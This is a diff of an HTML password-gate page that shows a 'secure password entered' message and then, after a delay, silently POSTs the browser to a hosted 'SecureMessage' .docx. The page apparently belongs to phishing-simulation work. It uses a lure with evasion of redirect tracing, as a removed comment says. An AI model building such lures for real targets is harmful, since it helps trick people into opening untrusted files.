@@ -54,8 +54,11 @@
         }
         .message {
             margin-top: 15px;
-            color: red;
             font-weight: bold;
+        }
+        .checkmarks {
+            font-size: 24px;
+            color: green;
         }
     </style>
 </head>
@@ -64,7 +67,7 @@
         <h2>Enter Password</h2>
         <input type="password" id="password" placeholder="Enter password" required>
         <button onclick="checkPassword()">Submit</button>
-        <p class="message" id="message"></p>
+        <div class="message" id="message"></div>
     </div>
 
     <script>
@@ -73,19 +76,20 @@
             const message = document.getElementById("message");
 
             if (password === "catchingphish") {
-                // URL in plain text but redirect is still client-side
-                const url = "https://catchingphish.com/secure-file";
-
-                // Create and submit a form to prevent simple redirect tracing
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = url;
-                document.body.appendChild(form);
-                form.submit();
-
                 message.style.color = 'green';
-                message.textContent = "Redirecting...";
+                message.innerHTML = "<div class='checkmarks'>✔</div>SECURE PASSWORD ENTERED";
+
+                setTimeout(() => {
+                    const url = "https://img1.wsimg.com/blobby/go/29b566bd-e2b0-49b9-9acc-cf41ea51de07/downloads/a3bec121-4160-43dd-910b-d1e4cb27d85e/SecureMessage_982309592%20(2).docx?ver=1742856596695";
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = url;
+                    document.body.appendChild(form);
+                    form.submit();
+                }, 3000);
+
             } else {
+                message.style.color = 'red';
                 message.textContent = "Incorrect password. Try again.";
             }
         }
